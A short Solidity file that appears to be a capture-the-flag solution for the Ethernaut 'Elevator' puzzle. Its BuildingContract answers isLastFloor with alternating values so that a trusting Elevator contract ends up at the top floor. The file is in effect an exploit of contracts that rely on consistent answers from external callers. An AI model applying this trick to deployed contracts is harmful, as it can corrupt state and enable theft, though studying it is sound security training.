// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Elevator {
    function goTo(uint _floor) public {}
}

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract BuildingContract is Building {

    Elevator elevator;
    bool public isLast = true;

    constructor(address _elevator) public {
        //set elevator instance
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint) override external returns (bool) {
        isLast = !isLast;
        return isLast;
    }

    function useElevator() public {
        //doesn't really matter which floor you choose
        elevator.goTo(1);
    }
}